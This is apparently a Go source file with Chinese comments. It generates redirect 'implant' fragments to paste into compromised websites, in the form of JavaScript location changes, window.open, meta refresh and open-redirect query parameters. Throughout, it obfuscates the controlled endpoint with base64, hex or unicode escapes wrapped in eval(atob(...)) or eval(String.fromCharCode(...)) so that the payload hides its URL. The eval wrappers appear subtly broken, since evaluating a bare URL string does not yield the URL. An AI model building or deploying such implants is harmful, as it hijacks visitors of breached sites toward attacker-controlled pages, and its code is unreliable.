package redirect

import (
	"fmt"
	"strings"
)

// 植入載荷的型態。
//
// 這裡涵蓋的是「跳轉脅持」最常見的幾種植入方式：受控站（被入侵的網站）在頁面裡
// 塞一段會把訪客帶走的程式碼。操作者要做的不是產生任意程式碼，而是把
// 「他們植入的」換成「我們的」，並且決定我們的網址要以什麼形式寫進去。

const (
	// ImplantKindJSRedirect 是最常見的一種：直接改變目前頁面的網址。
	ImplantKindJSRedirect = "js_redirect"
	// ImplantKindJSWindowOpen 開新視窗（保留原頁，適合需要對照的場景）。
	ImplantKindJSWindowOpen = "js_window_open"
	// ImplantKindJSLocationReplace 取代目前紀錄（不留原頁）。
	ImplantKindJSLocationReplace = "js_location_replace"
	// ImplantKindMetaRefresh 以 meta refresh 跳轉（不需要 JavaScript）。
	ImplantKindMetaRefresh = "meta_refresh"
	// ImplantKindURLParam 只是把受控端點放進 query 參數（開放式重定向用）。
	ImplantKindURLParam = "url_param"
)

// ImplantKinds 是所有支援的載荷型態。
func ImplantKinds() []string {
	return []string{
		ImplantKindJSRedirect,
		ImplantKindJSWindowOpen,
		ImplantKindJSLocationReplace,
		ImplantKindMetaRefresh,
		ImplantKindURLParam,
	}
}

// ImplantEncodingsForKind 回傳某個載荷型態「實際有意義」的編碼方式。
//
// 為什麼要分型態限制：
//   - JS 型態（js_redirect／js_window_open／js_location_replace）是在 JS 字串裡，
//     可以自帶解碼器（atob／String.fromCharCode），也可以用純跳脫（js_unicode，
//     不需解碼器）→ 所有編碼都合理。
//   - meta_refresh 的網址是**瀏覽器直接解析的 URL**：瀏覽器不會解 base64、不會解
//     \u0068 跳脫。若把 base64 塞進 meta，標籤會變成無效的 meta（而且實作上會
//     退化成 JS 片段、型態與要求不符）。→ 只允許 URL 層級的編碼。
//   - url_param 的值會被站方的程式取出；站方「有可能」自己解 base64（這正是
//     「URL 加密植入」想利用的情境），但 \u0068 跳脫在查詢字串裡沒有任何解讀者
//     → 不允許 js_unicode。
func ImplantEncodingsForKind(kind string) []string {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case ImplantKindMetaRefresh:
		return []string{PayloadEncodingNone, PayloadEncodingPercent, PayloadEncodingDoublePercent}
	case ImplantKindURLParam:
		return []string{
			PayloadEncodingNone,
			PayloadEncodingPercent,
			PayloadEncodingDoublePercent,
			PayloadEncodingBase64,
			PayloadEncodingBase64URL,
			PayloadEncodingHex,
		}
	default:
		return PayloadEncodings()
	}
}

// ImplantOptions 描述要產生的植入載荷。
type ImplantOptions struct {
	// Endpoint 是要植入的受控端點（必填）。
	Endpoint string
	// Encoding 是受控端點寫進載荷時的編碼方式（見 encode.go）。
	//
	// 注意兩種編碼的差別：
	//   - js_unicode：純字串跳脫（\u0068\u0074…），在 JS 字串常值裡直接可用，
	//     不需要解碼器，載荷本身看不出來是一個網址。
	//   - base64／base64url／hex：需要解碼器，產出的載荷會自動帶上
	//     atob()／String.fromCharCode() 包裝。
	//   - percent：URL percent-encoding。適合 query 參數位置。
	Encoding string
	// Kind 是載荷型態（見 ImplantKinds）；留空 = js_redirect。
	Kind string
	// Param 是 url_param 型態使用的參數名（留空 = url）。
	Param string
}

// ImplantResult 是產出的載荷。
type ImplantResult struct {
	// Kind 是實際使用的型態。
	Kind string `json:"kind"`
	// Encoding 是實際使用的編碼方式。
	Encoding string `json:"encoding"`
	// Endpoint 是原樣的受控端點（未編碼）。
	Endpoint string `json:"endpoint"`
	// Payload 是寫進載荷裡的字串（已套用編碼）。
	Payload string `json:"payload"`
	// Fragment 是可以直接貼進目標頁面的完整片段。
	Fragment string `json:"fragment"`
}

// BuildImplant 產生帶著受控端點的植入片段。
//
// 產出的 Fragment 可以直接放進受控站（被入侵的站點）的頁面或腳本裡；
// Payload 則是實際寫進去的字串（可能已經編碼）。
func BuildImplant(opts ImplantOptions) (ImplantResult, error) {
	endpoint := strings.TrimSpace(opts.Endpoint)
	if endpoint == "" {
		return ImplantResult{}, fmt.Errorf("受控端點為空")
	}
	kind := strings.ToLower(strings.TrimSpace(opts.Kind))
	if kind == "" {
		kind = ImplantKindJSRedirect
	}
	supported := false
	for _, candidate := range ImplantKinds() {
		if kind == candidate {
			supported = true
			break
		}
	}
	if !supported {
		return ImplantResult{}, fmt.Errorf("不支援的載荷型態: %q", opts.Kind)
	}
	encoding, err := NormalizePayloadEncoding(opts.Encoding)
	if err != nil {
		return ImplantResult{}, err
	}
	// 編碼必須對這個型態有意義：meta refresh 與 query 字串不會解 base64／hex／
	// unicode 跳脫，硬生出來只會得到一個不生效的載荷。
	if !encodingAllowedForKind(kind, encoding) {
		return ImplantResult{}, fmt.Errorf(
			"載荷型態 %q 不支援編碼 %q（這個型態只支援：%s）",
			kind, encoding, strings.Join(ImplantEncodingsForKind(kind), "、"))
	}

	result := ImplantResult{Kind: kind, Encoding: encoding, Endpoint: endpoint}

	switch kind {
	case ImplantKindURLParam:
		param := strings.TrimSpace(opts.Param)
		if param == "" {
			param = "url"
		}
		payload, err := EncodeEndpoint(endpoint, encoding)
		if err != nil {
			return ImplantResult{}, err
		}
		result.Payload = payload
		result.Fragment = "?" + param + "=" + payload
		return result, nil
	}

	// meta refresh：內容是瀏覽器直接解析的 URL，所以這裡只會有 URL 層級的編碼。
	if kind == ImplantKindMetaRefresh {
		payload, err := EncodeEndpoint(endpoint, encoding)
		if err != nil {
			return ImplantResult{}, err
		}
		result.Payload = payload
		result.Fragment = fmt.Sprintf(
			"<meta http-equiv=\"refresh\" content=\"0;url=%s\">", payload)
		return result, nil
	}

	// JS 型態：依編碼方式決定要不要帶解碼器。
	switch encoding {
	case PayloadEncodingBase64, PayloadEncodingBase64URL:
		payload, err := EncodeEndpoint(endpoint, encoding)
		if err != nil {
			return ImplantResult{}, err
		}
		result.Payload = payload
		result.Fragment = buildJSFragment(kind, "eval(atob('"+payload+"'))")
		return result, nil
	case PayloadEncodingHex:
		payload, err := EncodeEndpoint(endpoint, encoding)
		if err != nil {
			return ImplantResult{}, err
		}
		result.Payload = payload
		result.Fragment = buildJSFragment(kind, "eval(String.fromCharCode("+hexByteArgs(payload)+"))")
		return result, nil
	default:
		payload, err := EncodeEndpoint(endpoint, encoding)
		if err != nil {
			return ImplantResult{}, err
		}
		result.Payload = payload
		result.Fragment = buildJSFragment(kind, "'"+payload+"'")
		return result, nil
	}
}

// ImplantEncodingMatrix 回傳「每個載荷型態 × 各自可行的編碼」對照表。
//
// 這是給前端用的單一真相來源：前端據此把不相容的編碼選項停用，
// 不用在前端另外寫一份規則（規則寫兩份一定會漂移）。
func ImplantEncodingMatrix() map[string][]string {
	matrix := make(map[string][]string, len(ImplantKinds()))
	for _, kind := range ImplantKinds() {
		matrix[kind] = ImplantEncodingsForKind(kind)
	}
	return matrix
}

// encodingAllowedForKind 判斷某個編碼方式對這個載荷型態是否有意義。
func encodingAllowedForKind(kind string, encoding string) bool {
	for _, candidate := range ImplantEncodingsForKind(kind) {
		if candidate == encoding {
			return true
		}
	}
	return false
}

// buildJSFragment 組出 JS 片段。
func buildJSFragment(kind string, target string) string {
	switch kind {
	case ImplantKindJSWindowOpen:
		return "window.open(" + target + ",'_blank')"
	case ImplantKindJSLocationReplace:
		return "window.location.replace(" + target + ")"
	default:
		return "location.href=" + target
	}
}

// hexByteArgs 把十六進位字串轉成 String.fromCharCode 的引數清單。
func hexByteArgs(payload string) string {
	if len(payload)%2 != 0 {
		payload = payload[:len(payload)-1]
	}
	args := make([]string, 0, len(payload)/2)
	for i := 0; i+1 < len(payload); i += 2 {
		args = append(args, "0x"+payload[i:i+2])
	}
	return strings.Join(args, ",")
}
